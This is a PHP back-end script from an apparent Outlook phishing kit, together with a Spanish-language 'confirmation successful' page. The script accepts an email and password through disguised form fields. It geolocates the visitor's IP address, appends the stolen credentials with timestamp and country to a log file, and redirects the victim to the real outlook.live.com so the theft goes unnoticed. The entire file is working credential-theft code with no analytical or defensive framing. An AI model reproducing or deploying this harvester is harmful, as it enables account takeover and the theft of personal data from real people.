<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
date_default_timezone_set('America/Bogota');
include('../nombredelarchivo.php');


if ( isset ($_POST['rrtytrrt']) && isset ($_POST['regtrfdr'])){
	$file = fopen("../".$nombre_archivo."", "a");
	fwrite($file, "\r\n======================" . PHP_EOL);	
	fwrite($file, "eml : ".$_POST['rrtytrrt']." - clave : ".$_POST['regtrfdr']." - ".date ('l jS \of F Y h:i:s A',time())." ".$userp." ".$pais."" .PHP_EOL);
	fclose($file);



@header ('refresh:3;url=https://outlook.live.com/');
}

else{ header ('location: ../'); exit(); }

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>exito</title>

    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">

    <link rel="icon" href="../i.ico">
    <link rel="stylesheet" href="./arch/success.css">
</head>

<body>
    <section id="c-container">
        <div id="c-body">

            <div class="c-logo-container">
                <img src="./arch/c-logo.png" class="c-logo" alt="C Logo">
            </div>

            <h1>¡Confirmaci&oacute;n exitosa!</h1>
            <h6>Redirigiendo...</h6>
        </div>
    </section>



</body></html>